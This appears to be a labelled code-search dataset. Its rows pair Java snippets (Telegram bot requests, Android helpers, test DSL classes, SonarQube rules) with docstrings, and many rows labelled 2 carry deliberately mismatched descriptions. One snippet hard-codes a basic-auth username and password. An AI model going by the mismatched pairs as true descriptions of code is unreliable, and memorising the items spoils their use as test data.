2	public class ForwardMessage extends BaseRequest?{ public ForwardMessage(Object chatId, Object fromChatId, int messageId) { super(SendResponse.class); add("chat_id", chatId).add("from_chat_id", fromChatId).add("message_id", messageId); } public ForwardMessage disableNotification(boolean disableNotification) { return add("disable_notification", disableNotification); } }	Messaged to update the selection based on a toggle selection event, which means the cell's selection state is inverted.
2	public class GameTest { public static void check(Game game) { assertNotNull(game.title()); assertNotNull(game.description()); assertNotNull(game.text()); assertNotNull(game.textEntities()); PhotoSizeTest.checkPhotos(game.photo()); AnimationTest.check(game.animation()); } }	Intalls the subcomponents of the graph, which is the renderer pane.
2	public class GetChat extends BaseRequest?{ public GetChat(Object chatId) { super(GetChatResponse.class); add("chat_id", chatId); } }	Creates an instance of TransferHandler. Used for subclassers to provide different TransferHandler.
2	public class GetChatAdministrators extends BaseRequest?{ public GetChatAdministrators(Object chatId) { super(GetChatAdministratorsResponse.class); add("chat_id", chatId); } }	Returns the renderer pane that renderer components are placed in.
2	public class GetChatAdministratorsResponse extends BaseResponse { private List?result; public List?administrators() { return result; } public String toString() { return "GetChatAdministratorsResponse{" + "result=" + result + '}'; } }	Invoked as part from the boilerplate install block.
2	public class LabeledPrice implements Serializable { private final static long serialVersionUID = 0L; private String label; private Integer amount; public LabeledPrice(String label, Integer amount) { this.label = label; this.amount = amount; } }	Returns an new consistent array of views for the ports.
2	public class LeaveChat extends BaseRequest?{ public LeaveChat(Object chatId) { super(BaseResponse.class); add("chat_id", chatId); } }	called to restore the state of a component because a drop was not performed.
2	public class LocationTest { public static void check(Location location) { assertNotNull(location.latitude()); assertNotNull(location.longitude()); } }	A set containing all attribute keys that are stored in the cell views, in other words, the view-local attributes.
2	public class Location implements Serializable { private final static long serialVersionUID = 0L; private Float longitude; private Float latitude; public Float longitude() { return longitude; } public Float latitude() { return latitude; } public boolean equals(Object o) { if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Location location = (Location) o; if (longitude != null ? !longitude.equals(location.longitude) : location.longitude != null) return false; return latitude != null ? latitude.equals(location.latitude) : location.latitude == null; } public int hashCode() { int result = longitude != null ? longitude.hashCode() : 0; result = 31 * result + (latitude != null ? latitude.hashCode() : 0); return result; } public String toString() { return "Location{" + "longitude=" + longitude + ", latitude=" + latitude + '}'; } }	Controls if all attributes are local. If this is false then the createLocalEdit will check the localAttributes set to see if a specific attribute is local, otherwise it will assume that all attributes are local. This allows to make all attributes local without actually knowing them. Default is false.
2	public class MessagesResponse extends BaseResponse { private Message[] result; MessagesResponse() { } public Message[] messages() { return result; } public String toString() { return "MessagesResponse{" + "result=" + Arrays.toString(result) + '}'; } }	Return all root cells that intersect the given rectangle.
2	public class MessageTest { public static void checkMessage(Message message) { assertNotNull(message.messageId()); assertNotNull(message.date()); ChatTest.checkChat(message.chat()); } public static void checkForwardedMessage(Message message) { checkMessage(message); assertNotNull(message.forwardDate()); UserTest.checkUser(message.forwardFrom()); } public static void checkTextMessage(Message message) { checkMessage(message); assertNotNull(message.text()); } }	Adds a listener for the GraphLayoutCacheEvent posted after the graph layout cache changes.
2	abstract class PassportElementErrorAbstractFile extends PassportElementError { private final static long serialVersionUID = 0L; private final String file_hash; public PassportElementErrorAbstractFile(String source, String type, String fileHash, String message) { super(source, type, message); file_hash = fileHash; } }	Changes the visibility state of the cells passed in. Note that the arrays must contain cells, not cell views.
2	public class PassportElementErrorDataField extends PassportElementError { private final static long serialVersionUID = 0L; private final String field_name; private final String data_hash; public PassportElementErrorDataField(String type, String fieldName, String dataHash, String message) { super("data", type, message); field_name = fieldName; data_hash = dataHash; } }	Makes the specified cells visible or invisible depending on the flag passed in. Note the cells really are cells, not cell views.
2	public class PassportElementErrorFile extends PassportElementErrorAbstractFile { private final static long serialVersionUID = 0L; public PassportElementErrorFile(String type, String fileHash, String message) { super("file", type, fileHash, message); } }	Messaged when the user has altered the value for the item identified by cell to newValue. If newValue signifies a truly new value the model should post a graphCellsChanged event. This calls augmentNestedMapForValueChange.
2	public class PassportElementErrorFiles extends PassportElementError { private final static long serialVersionUID = 0L; private String[] file_hashes; public PassportElementErrorFiles(String type, String[] fileHashes, String message) { super("files", type, message); file_hashes = fileHashes; } }	Inserts the cloned cells from the clone map and clones the passed-in arguments according to the clone map before insertion and returns the clones in order of the cells. This example shows how to clone the current selection and get a reference to the clones:
2	public class PassportElementErrorFrontSide extends PassportElementErrorAbstractFile { private final static long serialVersionUID = 0L; public PassportElementErrorFrontSide(String type, String fileHash, String message) { super("front_side", type, fileHash, message); } }	Inserts the specified edge into the graph model. This method does in fact nothing, it calls insert with a default connection set.
2	public class PassportElementErrorReverseSide extends PassportElementErrorAbstractFile { private final static long serialVersionUID = 0L; public PassportElementErrorReverseSide(String type, String fileHash, String message) { super("reverse_side", type, fileHash, message); } }	Variant of the insert method that allows to pass a default connection set and parent map and nested map.
2	public class ReplyKeyboardRemove extends Keyboard implements Serializable { private final static long serialVersionUID = 0L; private final boolean remove_keyboard = true; private final boolean selective; public ReplyKeyboardRemove() { this(false); } public ReplyKeyboardRemove(boolean selective) { this.selective = selective; } }	Toggles the collapsed state of the specified cells.
2	class SecretHash { private final byte[] secretHash; public SecretHash(byte[] secret, byte[] hash) throws Exception { secretHash = sha512(concat(secret, hash)); } public byte[] key() { return Arrays.copyOfRange(secretHash, 0, 32); } public byte[] iv() { return Arrays.copyOfRange(secretHash, 32, 48); } private byte[] sha512(byte[] string) throws NoSuchAlgorithmException { MessageDigest md = MessageDigest.getInstance("SHA-512"); return md.digest(string); } private byte[] concat(byte[]... arrays) { int length = 0; for (byte[] array : arrays) { length += array.length; } byte[] result = new byte[length]; int pos = 0; for (byte[] array : arrays) { for (byte element : array) { result[pos] = element; pos++; } } return result; } }	Ungroups all groups in cells and returns the children that are not ports. Note: This replaces the parents with their group cells in the group structure.
2	public class SendGame extends AbstractSendRequest?{ public SendGame(Object chatId, String gameShortName) { super(chatId); add("game_short_name", gameShortName); } }	Collapses all groups by hiding all their descendants.
2	public class SendLocation extends AbstractSendRequest?{ public SendLocation(Object chatId, float latitude, float longitude) { super(chatId); add("latitude", latitude); add("longitude", longitude); } public SendLocation livePeriod(int livePeriod) { return add("live_period", livePeriod); } }	Ungroups all groups in cells and returns the children that are not ports. Note: This replaces the parents with their group cells in the group structure.
2	public class SendMediaGroup extends BaseRequest?{ private boolean isMultipart = false; public SendMediaGroup(Object chatId, InputMedia... media) { super(MessagesResponse.class); add("chat_id", chatId).add("media", serialize(media)); for (InputMedia m : media) { Mapattachments = m.getAttachments(); if (attachments != null && attachments.size() > 0) { addAll(attachments); isMultipart = true; } } } public SendMediaGroup disableNotification(boolean disableNotification) { return add("disable_notification", disableNotification); } public SendMediaGroup replyToMessageId(int replyToMessageId) { return add("reply_to_message_id", replyToMessageId); } public boolean isMultipart() { return isMultipart; } }	Expands all groups by showing all children. (Note: This does not show all descandants, but only the first generation of children.)
2	public class SendMessage extends AbstractSendRequest?{ public SendMessage(Object chatId, String text) { super(chatId); add("text", text); } public SendMessage parseMode(ParseMode parseMode) { return add("parse_mode", parseMode.name()); } public SendMessage disableWebPagePreview(boolean disableWebPagePreview) { return add("disable_web_page_preview", disableWebPagePreview); } }	A shortcut method that takes a nested map and passes it to the edit method.
2	public XComponent getComponent() { return this.doc; }	Constructs an instance of with the specified detail message.
2	public boolean isFolder(String url) throws java.io.IOException { boolean answer = false; try { answer = this.access.isFolder(url); } catch (com.sun.star.ucb.CommandAbortedException e) { throw new java.io.IOException(e.getLocalizedMessage()); } catch (com.sun.star.uno.Exception e) { throw new java.io.IOException(e.getLocalizedMessage()); } return answer; }	Refreshes the remote OpenOffice.org server information.
2	public static FileType checkType(String url) { String lcUrl = url.toLowerCase(); for (FileType type : FileType.values()) { if (lcUrl.endsWith(type.suffix)) { return type; } } return null; }	The resource ID of the file type description
2	public ImpressController getImpressController() { if (this.impressController == null) { this.impressController = new ImpressController(this); } return this.impressController; }	Creates a new instance of an OpenOffice.org remote connection.
2	public FileAccess getFileAccess() { if (this.fileAccess == null) { this.fileAccess = new FileAccess(this); } return this.fileAccess; }	Is thrown when there is no running presentation.
2	public void open(View btnOpen) { RemoteControllerActivity.savedConn = this.conn; this.startActivityForResult( new Intent(this, FileChooserActivity.class), REQUEST_OPEN_FILE); return; }	The bitmap of the preview of the next-next slide.
2	public void start(View btnPlay) { TextView txtMessage = (TextView) this.findViewById(R.id.message); Spinner spnDocument = (Spinner) this.findViewById(R.id.doc); OfficeConnection.Document selected = (OfficeConnection.Document) spnDocument.getSelectedItem(); this.enableButtons(false); if (selected == null) { txtMessage.setText(R.string.err_missing_presentation); } else { try { this.controller.start(selected); txtMessage.setText(""); } catch (com.sun.star.comp.helper.BootstrapException e) { txtMessage.setText(e.getMessage()); } catch (com.sun.star.connection.NoConnectException e) { txtMessage.setText(e.getMessage()); } catch (com.sun.star.connection.ConnectionSetupException e) { txtMessage.setText(e.getMessage()); } catch (tw.idv.imacat.android.mpresent.uno.ClosedException e) { txtMessage.setText(e.getMessage()); } } this.redraw(); this.enableButtons(true); return; }	Compares this object with the specified object for order. Returns a negative integer, zero, or a positive integer as this object is less than, equal to, or greater than the specified object.
2	protected void onActivityResult(int requestCode, int resultCode, Intent data) { if (requestCode == REQUEST_OPEN_FILE) { if (resultCode == Activity.RESULT_OK) { this.redraw(); } } return; }	Connects to the OpenOffice.org process.
2	private void redraw() { this.enableButtons(false); this.redraw(this.getRedrawData()); this.enableButtons(true); return; }	Goes to the next-next slide.
1	int I_OFF1 = 0, I_OFF2 = 1, I_OFF3 = 2;	n - number of checkers off off1 - 1 n >= 5 n/5 otherwise off2 - 1 n >= 10 (n-5)/5 n < 5 < 10 0 otherwise off3 - (n-10)/5 n > 10 0 otherwise
1	int I_ACONTAIN = 11;	Maximum containment of opponent checkers, from our points 9 to op back checker. Value is (1 - n/36), where n is number of rolls to escape.
1	int I_CONTAIN = 13;	Maximum containment, from our point 9 to home. Value is (1 - n/36), where n is number of rolls to escape.
1	int RI_OFF = 92;	(0 <= k < 14), RI_OFF + k = 1 if exactly k+1 checkers are off, 0 otherwise
1	int RI_NCROSS = 92 + 14;	Number of cross-overs by outside checkers
2	private Reward calcDeltaReward(final Move move) { Board prevBoard = currentBoard(); float prevQValue[] = evaluatePosition(prevBoard, Evaluator.classifyPosition(prevBoard)).data(); float predictedGreedyReward[] = move.arEvalMove().data(); float deltaReward[] = new float[Constants.NUM_OUTPUTS()]; for(int i = 0; i < deltaReward.length; i++) { deltaReward[i] = predictedGreedyReward[i] + predictedGreedyReward[i] * gamma - prevQValue[i]; } return new Reward(deltaReward); }	Q update rule
2	public class GV { public static final String NAME = "JETRIS"; public static final String VERSION = "1.2"; public static final String WEB_PAGE = "https://github.com/devng/jetris"; public static final String IMG_FOLDER = "img/"; public static final String DAT_FILE = "JETRIS.DAT"; }	Global Variables
1	@Override public void onItemClick(AdapterView?parent, View view, int position, long id) { Intent i = new Intent(); i.setClass(this, org.mmaug.InfoCenter.activities.NewsDetailActivity.class); Bundle bundle = new Bundle(); bundle.putSerializable("news", mNe	Callback method to be invoked when an item in this AdapterView has been clicked. Implementers can call getItemAtPosition(position) if they need to access the data associated with the selected item.
1	@Override protected RecyclerView.Adapter getAdapter() { mAdapter = new NewsAdapter(AlertActivity.this); mAdapter.setOnItemClickListener(this); //This is the code to provide a sectioned grid return mAdapter; }	Implement this with the Custom Adapters of your choice.
1	@Override protected RecyclerView.ItemDecoration getItemDecoration() { return new DividerDecoration(this, DividerDecoration.VERTICAL_LIST); }	Implement this with the ItemDecoration of your choice.
1	public class ApiRequestInterceptor implements RequestInterceptor { private Context mContext; public ApiRequestInterceptor(Context context) { this.mContext = context; } @Override public void intercept(RequestFacade requestFacade) { final String authorizationValue = encodeCredentialsForBasicAuthorization(); requestFacade.addHeader("Authorization", authorizationValue); } private String encodeCredentialsForBasicAuthorization() { CharSequence c = String.format(mContext.getString(R.string.location_auth), "bob", "ef7db280f5"); return "Basic " + Base64.encodeToString(c.toString().getBytes(), Base64.NO_WRAP); } }	Interceptor used to authorize requests.
2	public class AuthUser { private String username; private String password; public AuthUser() { } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } }	Created by indexer on 8/3/15.
1	public static boolean isConnected(Context context) { NetworkInfo info = ConnectionManager.getNetworkInfo(context); return (info != null && info.isConnected()); }	Check if there is any connectivity
1	public static NetworkInfo getNetworkInfo(Context context) { ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); return cm.getActiveNetworkInfo(); }	Get the network info
1	public static boolean isConnectedWifi(Context context) { NetworkInfo info = ConnectionManager.getNetworkInfo(context); return (info != null && info.isConnected() && info.getType() == ConnectivityManager.TYPE_WIFI); }	Check if there is any connectivity to a Wifi network
1	public static boolean isConnectedMobile(Context context) { NetworkInfo info = ConnectionManager.getNetworkInfo(context); return (info != null && info.isConnected() && info.getType() == ConnectivityManager.TYPE_MOBILE); }	Check if there is any connectivity to a mobile network
1	public class ConnectionManager { public static boolean isConnected(Context context) { NetworkInfo info = ConnectionManager.getNetworkInfo(context); return (info != null && info.isConnected()); } public static NetworkInfo getNetworkInfo(Context context) { ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); return cm.getActiveNetworkInfo(); } public static boolean isConnectedWifi(Context context) { NetworkInfo info = ConnectionManager.getNetworkInfo(context); return (info != null && info.isConnected() && info.getType() == ConnectivityManager.TYPE_WIFI); } public static boolean isConnectedMobile(Context context) { NetworkInfo info = ConnectionManager.getNetworkInfo(context); return (info != null && info.isConnected() && info.getType() == ConnectivityManager.TYPE_MOBILE); } public static void failOnUnexpectedError(RetrofitError retrofitError) { if (!retrofitError.getKind().equals(Kind.NETWORK) && (retrofitError.getResponse() == null)) { throw new RuntimeException(retrofitError.getMessage(), retrofitError); } } }	Check device's network connectivity and speed
2	public class HelloWorld { public static void main(String[] args) { System.out.println("Hello World"); } }	(c) 2015 Cazcade Limited
2	public class Page implements Serializable{ private static final long serialVersionUID = 1L; public long id; public long group_id; public String title; public static Page parseFromAttachment(JSONObject o) throws NumberFormatException, JSONException{ Page page = new Page(); page.title = Api.unescape(o.optString("title")); page.id = o.optLong("id"); page.group_id = o.optLong("group_id"); return page; } }	Wiki page
2	public static final int config_uiABBg=0x7f090001;	ADWSettings theme config
2	public static final int bubble_color=0x7f070000;	Theme specific appearance settings
2	public static void main(String[] args) { ListApplication app = new ListApplication(); app.start(); }	Main method stub.
2	private void setupTabbedPanels() { tabPane = new JTabbedPane(); tabPane.addTab("Player", playerPanel); tabPane.setMnemonicAt(0, KeyEvent.VK_P); textArea = new JTextArea(15, 25); JScrollPane scrollArea = new JScrollPane(textArea); scrollArea.setVerticalScrollBarPolicy( ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED); scrollArea.setHorizontalScrollBarPolicy( ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER); textArea.setEditable(false); teamPanel.add(scrollArea); tabPane.addTab("Team", teamPanel); tabPane.setMnemonicAt(1, KeyEvent.VK_T); }	
1	private void loadTeamInfo() { if (playerFile != null && (list.size() > 1 || list != null)) { for (Player p : list) { textArea.setText(textArea.getText() + p.toString() + "\n\n"); } } else { JOptionPane.showMessageDialog(frame, "No file is present. You must select a file for the program to read from.", "File Read Error(Null)", JOptionPane.ERROR_MESSAGE); } }	Loads the team information into the text area.
1	public class Player implements Comparable?{ @SuppressWarnings("FieldMayBeFinal") private int number; @SuppressWarnings("FieldMayBeFinal") private String name; @SuppressWarnings("FieldMayBeFinal") private char position; @SuppressWarnings("FieldMayBeFinal") private double avgPoints; @SuppressWarnings("FieldMayBeFinal") private double avgRebounds; @SuppressWarnings("FieldMayBeFinal") private double avgAssists; public Player(String pName, int pNbr, char pPos, double pPoints, double pRebounds, double pAssists) { name = pName; number = pNbr; position = pPos; avgPoints = pPoints; avgRebounds = pRebounds; avgAssists = pAssists; } @Override public String toString() { return "Player: " + name + "\n Number: " + number + "\n Position: " + position + "\n Points/Game: " + avgPoints + "\n Rebounds/Game: " + avgRebounds + "\n Assists/Game: " + avgAssists; } public String toFile() { return name + " " + number + " " + position + " " + avgPoints + " " + avgRebounds + " " + avgAssists; } public String getName() { return name; } public int getNum() { return number; } public String getPosition() { if (position == 'C') { return "Center"; } if (position == 'F') { return "Forward"; } if (position == 'G') { return "Guard"; } if (position == 'P') { return "Point Guard"; } return "Invalid Position"; } public double getAvgPoints() { return avgPoints; } public double getAvgRebounds() { return avgRebounds; } public double getAvgAssists() { return avgAssists; } @Override public int compareTo(Player p) { if (avgPoints > p.avgPoints) { return 1; } else if (avgPoints < p.avgPoints) { return -1; } else { return 0; } } }	This class is used to hold and retrieve all information about a specific player.
2	public OvalButton(String text) { super(); setText(text); setContentAreaFilled(false); setBorderPainted(false); setFont(new Font("Thoma", Font.BOLD, 12)); setForeground(Color.WHITE); setFocusable(false); }	Constructor takes String argument
1	public static void insertMessage(Throwable onObject, String msg) { try { Field field = Throwable.class.getDeclaredField("detailMessage"); field.setAccessible(true); if (onObject.getMessage() != null) { field.set(onObject, "\n[\n" + msg + "\n]\n[\nMessage: " + onObject.getMessage() + "\n]"); } else { field.set(onObject, "\n[\n" + msg + "]\n"); } } catch (RuntimeException e) { throw e; } catch (Exception e) { } }	Addes a message at the beginning of the stacktrace.
1	class ExceptionUtils { public static void insertMessage(Throwable onObject, String msg) { try { Field field = Throwable.class.getDeclaredField("detailMessage"); field.setAccessible(true); if (onObject.getMessage() != null) { field.set(onObject, "\n[\n" + msg + "\n]\n[\nMessage: " + onObject.getMessage() + "\n]"); } else { field.set(onObject, "\n[\n" + msg + "]\n"); } } catch (RuntimeException e) { throw e; } catch (Exception e) { } } }	Utilities for java exceptions.
1	public class FrutillaExamplesWithAnnotationTest { @Frutilla( Given = "a test with Frutilla annotations", When = "it fails", Then = { "it shows the test description in the stacktrace", "and in the logs" } ) @Test public void testFailed() { // assertTrue(false); } @Frutilla( Given = "a test with Frutilla annotations", When = "it fails due to error", Then = { "it shows the test description in the stacktrace", "and in the logs" } ) @Test public void testError() { // throw new RuntimeException("forced error"); } @Frutilla( Given = "a test with Frutilla annotations", When = "it passes", Then = "it shows the test description in the logs" ) @Test public void testPassed() { assertTrue(true); } }	Examples using Frutilla with annotations.
1	static Scenario scenario(String text) { reset(); final Scenario scenario = new Scenario(text); sRoot = scenario; return scenario; }	Describes the scenario of the use case.
2	static Given given(String text) { reset(); final Given given = new Given(text); sRoot = given; return given; }	Describes the entry point of the use case.
1	public static class Given extends AbstractSentence { private Given(String sentence) { super(sentence, "GIVEN"); } private Given(String[] sentences) { super(sentences, "GIVEN"); } private Given(String sentence, String header) { super(sentence, header); } public When when(String sentence) { When when = new When(sentence); addChild(when); return when; } When when(String[] sentences) { When when = new When(sentences); addChild(when); return when; } @Override public Given and(String sentence) { return (Given) addChild(new Given(sentence, AND)); } @Override public Given but(String sentence) { return (Given) addChild(new Given(sentence, BUT)); } }	Group of sentences describing the entry point of the use case, using plain text.
2	public Given given(String sentence) { Given given = new Given(sentence); addChild(given); return given; }	Starts describing the action executed in the use case.
1	public static class Scenario extends AbstractSentence { private Scenario(String sentence) { super(sentence, "SCENARIO"); } private Scenario(String[] sentences) { super(sentences, "SCENARIO"); } private Scenario(String sentence, String header) { super(sentence, header); } public Given given(String sentence) { Given given = new Given(sentence); addChild(given); return given; } Given given(String[] sentences) { Given given = new Given(sentences); addChild(given); return given; } @Override public Scenario and(String sentence) { return (Scenario) addChild(new Scenario(sentence, AND)); } @Override public Scenario but(String sentence) { return (Scenario) addChild(new Scenario(sentence, BUT)); } }	Group of sentences describing the scenario of the use case, using plain text.
1	public static class Then extends AbstractSentence { private Then(String sentence) { super(sentence, "THEN"); } private Then(String[] sentences) { super(sentences, "THEN"); } private Then(String sentence, String header) { super(sentence, header); } @Override public Then and(String sentence) { return (Then) addChild(new Then(sentence, AND)); } @Override public Then but(String sentence) { return (Then) addChild(new Then(sentence, BUT)); } }	Describes in plain text the expected behavior after executing the use case.
2	public Then then(String sentence) { return (Then) addChild(new Then(sentence)); }	Starts describing in plain text the expected behavior after executing the use case.
1	public static class When extends AbstractSentence { private When(String sentence) { super(sentence, "WHEN"); } private When(String[] sentences) { super(sentences, "WHEN"); } private When(String sentence, String header) { super(sentence, header); } public Then then(String sentence) { return (Then) addChild(new Then(sentence)); } Then then(String[] sentences) { return (Then) addChild(new Then(sentences)); } @Override public When and(String sentence) { return (When) addChild(new When(sentence, AND)); } @Override public When but(String sentence) { return (When) addChild(new When(sentence, BUT)); } }	A group of sentences describing the action to execute in the use case, using plain text.
2	public class KeyboardAdapter extends RecyclerView.Adapter?{ private static final String TAG = "KeyboardAdapter"; private List?mStrings; private LayoutParams mLayoutParams; private NaughtyStringsIME mIME; public KeyboardAdapter(Context context, NaughtyStringsIME ime) { mStrings = new ArrayList<>(); try { JsonReader reader = new JsonReader(new InputStreamReader(context.getAssets().open("blns.json"), "UTF-8")); reader.beginArray(); while (reader.hasNext()) { mStrings.add(reader.nextString()); } reader.endArray(); reader.close(); } catch (UnsupportedEncodingException e) { Log.e(TAG, "", e); } catch (IOException e) { Log.e(TAG, "", e); } catch (Exception e) { Log.e(TAG, "", e); } mLayoutParams = new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT); mIME = ime; } public Holder onCreateViewHolder(ViewGroup viewGroup, int i) { TextView string = new TextView(viewGroup.getContext()); string.setPadding(10, 10, 0, 10); string.setLayoutParams(mLayoutParams); string.setOnClickListener(mIME); Holder holder = new Holder(string); return holder; } public void onBindViewHolder(Holder holder, int i) { holder.mStringView.setText(mStrings.get(i)); } public int getItemCount() { return mStrings.size(); } class Holder extends RecyclerView.ViewHolder { TextView mStringView; public Holder(View itemView) { super(itemView); mStringView = (TextView) itemView; } } }	Created by rajasharan on 8/15/15.
1	public void define(Context context) { NewRepository repo = context.createRepository(repositoryKey(), "json").setName(repositoryName()); new AnnotationBasedRulesDefinition(repo, "json").addRuleClasses(false, ImmutableList.copyOf(checkClasses())); repo.done(); }	Defines rule repository with check metadata from check classes' annotations. This method should be overridden if check metadata are provided via another format, e.g: XMl, JSON.
1	public abstract class CustomJSONRulesDefinition implements RulesDefinition { public void define(Context context) { NewRepository repo = context.createRepository(repositoryKey(), "json").setName(repositoryName()); new AnnotationBasedRulesDefinition(repo, "json").addRuleClasses(false, ImmutableList.copyOf(checkClasses())); repo.done(); } public abstract String repositoryName(); public abstract String repositoryKey(); public abstract Class[] checkClasses(); }	Extension point to create custom rule repository for JSON.
2	public static CheckVerifier verify(JSONCheck check, File file, Charset charset) { if (check instanceof CharsetAwareVisitor) { ((CharsetAwareVisitor) check).setCharset(charset); } return CheckVerifier.verify(getTestIssues(file.getAbsolutePath(), check, charset)); }	
1	public class JSONCheckVerifier { private JSONCheckVerifier() { } public static CheckVerifier verify(JSONCheck check, File file) { return verify(check, file, Charsets.UTF_8); } public static CheckVerifier verify(JSONCheck check, File file, Charset charset) { if (check instanceof CharsetAwareVisitor) { ((CharsetAwareVisitor) check).setCharset(charset); } return CheckVerifier.verify(getTestIssues(file.getAbsolutePath(), check, charset)); } private static Collection?getTestIssues(String relativePath, JSONCheck check, Charset charset) { File file = new File(relativePath); JsonTree jsonTree = (JsonTree) JSONParserBuilder.createParser(charset).parse(file); JSONVisitorContext context = new JSONVisitorContext(jsonTree, file); List?issues = check.scanFile(context); List?testIssues = new ArrayList<>(); for (Issue issue : issues) { TestIssue testIssue; if (issue instanceof FileIssue) { FileIssue fileIssue = (FileIssue) issue; testIssue = new TestIssue(fileIssue.message()); for (IssueLocation issueLocation : fileIssue.secondaryLocations()) { testIssue.addSecondaryLine(issueLocation.startLine()); } } else if (issue instanceof LineIssue) { LineIssue lineIssue = (LineIssue) issue; testIssue = new TestIssue(lineIssue.message()) .starLine(lineIssue.line()); } else { PreciseIssue preciseIssue = (PreciseIssue) issue; testIssue = new TestIssue(preciseIssue.primaryLocation().message()) .starLine(preciseIssue.primaryLocation().startLine()) .startColumn(preciseIssue.primaryLocation().startLineOffset() + 1) .endLine(preciseIssue.primaryLocation().endLine()) .endColumn(preciseIssue.primaryLocation().endLineOffset() + 1); for (IssueLocation issueLocation : preciseIssue.secondaryLocations()) { testIssue.addSecondaryLine(issueLocation.startLine()); } } if (issue.cost() != null) { testIssue.cost(issue.cost()); } testIssues.add(testIssue); } return testIssues; } }	To unit test checks.
2	public String repositoryName() { return "My JSON Custom Repository"; }	The title bar that implements our dragging and state manipulation.
2	public String repositoryKey() { return "custom-json"; }	The dock pane this dock node belongs to when not floating.
1	public Class[] checkClasses() { return new Class[] { ForbiddenKeysCheck.class, ForbiddenStringCheck.class }; }	Provide the list of classes implementing rules.
1	public class MyJSONCustomRulesDefinition extends CustomJSONRulesDefinition { public String repositoryName() { return "My JSON Custom Repository"; } public String repositoryKey() { return "custom-json"; } public Class[] checkClasses() { return new Class[] { ForbiddenKeysCheck.class, ForbiddenStringCheck.class }; } }	Extension point to define a JSON rule repository.
1	public class MyJSONCustomRulesPlugin implements Plugin { public void define(Context context) { context.addExtensions( ImmutableList.of( MyJSONCustomRulesDefinition.class)); } }	Extension point to define a SonarQube plugin.
1	final class AndroidAwareClassLoader { private static final String TEST_CLASSPATH_FILE_NAME = "/additional-test-classpath.txt"; private AndroidAwareClassLoader() { throw new AssertionError(); } static ClassLoader create() { try { InputStream stream = AndroidAwareClassLoader.class.getResourceAsStream(TEST_CLASSPATH_FILE_NAME); URL[] urls = IOUtils.readLines(stream, Charset.forName("UTF-8")) .stream() .map(AndroidAwareClassLoader::unsafeToURL) .toArray(URL[]::new); return new URLClassLoader(urls, ClassLoader.getSystemClassLoader()); } catch (IOException e) { throw new RuntimeException(e); } } private static URL unsafeToURL(String spec) { try { return new URL(spec); } catch (MalformedURLException e) { throw new RuntimeException(e); } } }	Configures and provides access to a ClassLoader which is used by our processor's unit tests, and extends the system ClassLoader with Android-specific classes provided through a test resource file. It works closely with our AarToJarDependencyPlugin and consumes the resource file generated by that plugin to inject Android-specific code into the code generation tests, so that they will compile properly.
1	public class ApiLevelTestSuite { private static final int MOST_RECENT_API_LEVEL = Build.VERSION_CODES.M; private static final int NEEDS_PERMISSION_CHECK = 1024; private final Context mockContext; public ApiLevelTestSuite() { mockContext = Mockito.mock(Context.class); } public void beforeTest() throws Exception { this.resetApiLevel(); PowerMockito.mockStatic(PermissionChecker.class); BDDMockito.given(PermissionChecker.checkSelfPermission(any(Context.class), anyString())).willReturn(NEEDS_PERMISSION_CHECK); } public void testAssumeApiLevelWorking() throws Exception { assumeApiLevel(ICE_CREAM_SANDWICH); assertEquals(ICE_CREAM_SANDWICH, Build.VERSION.SDK_INT); resetApiLevel(); assertEquals(0, Build.VERSION.SDK_INT); } public void testCheckSelfPermissionMockWorking() throws Exception { assertEquals(NEEDS_PERMISSION_CHECK, PermissionChecker.checkSelfPermission(mockContext, "permission")); } public void testAddVoicemailPermission() throws Exception { iteratePermissionCheck(Manifest.permission.ADD_VOICEMAIL, ICE_CREAM_SANDWICH); } public void testBodySensorsPermission() throws Exception { iteratePermissionCheck(Manifest.permission.BODY_SENSORS, KITKAT_WATCH); } public void testReadCallLogPermission() throws Exception { iteratePermissionCheck(Manifest.permission.READ_CALL_LOG, JELLY_BEAN); } public void testReadExternalStoragePermission() throws Exception { iteratePermissionCheck(Manifest.permission.READ_EXTERNAL_STORAGE, JELLY_BEAN); } public void testUseSipPermission() throws Exception { iteratePermissionCheck(Manifest.permission.USE_SIP, GINGERBREAD); } public void testWriteCallLogPermission() throws Exception { iteratePermissionCheck(Manifest.permission.WRITE_CALL_LOG, JELLY_BEAN); } private void iteratePermissionCheck(String permission, int permissionMinLevel) throws Exception { for (int apiLevel = 0; apiLevel <= MOST_RECENT_API_LEVEL; apiLevel++) { assumeApiLevel(apiLevel); boolean shouldAutoGrantPermission = apiLevel < permissionMinLevel; boolean hasPermission = PermissionUtils.hasSelfPermissions(mockContext, permission); if (shouldAutoGrantPermission != hasPermission) { throw new AssertionError(permission + " check on API level " + apiLevel + " shouldn't return auto-grant=" + shouldAutoGrantPermission + " amd has-permission=" + hasPermission); } } } private void assumeApiLevel(int apiLevel) throws Exception { Field sdkIntField = Build.VERSION.class.getDeclaredField("SDK_INT"); sdkIntField.setAccessible(true); Field modifiersField = Field.class.getDeclaredField("modifiers"); modifiersField.setAccessible(true); modifiersField.setInt(sdkIntField, sdkIntField.getModifiers() & ~Modifier.FINAL); sdkIntField.set(null, apiLevel); modifiersField.setInt(sdkIntField, sdkIntField.getModifiers() | Modifier.FINAL); sdkIntField.setAccessible(false); } private void resetApiLevel() throws Exception { this.assumeApiLevel(0); } }	Test suite related to permissions that were added to Android at a later point in the platform's lifecycle.
2	public static int calculatePreviewOrientation(Camera.CameraInfo info, int rotation) { int degrees = 0; switch (rotation) { case Surface.ROTATION_0: degrees = 0; break; case Surface.ROTATION_90: degrees = 90; break; case Surface.ROTATION_180: degrees = 180; break; case Surface.ROTATION_270: degrees = 270; break; } int result; if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) { result = (info.orientation + degrees) % 360; result = (360 - result) % 360; } else { result = (info.orientation - degrees + 360) % 360; } return result; }	
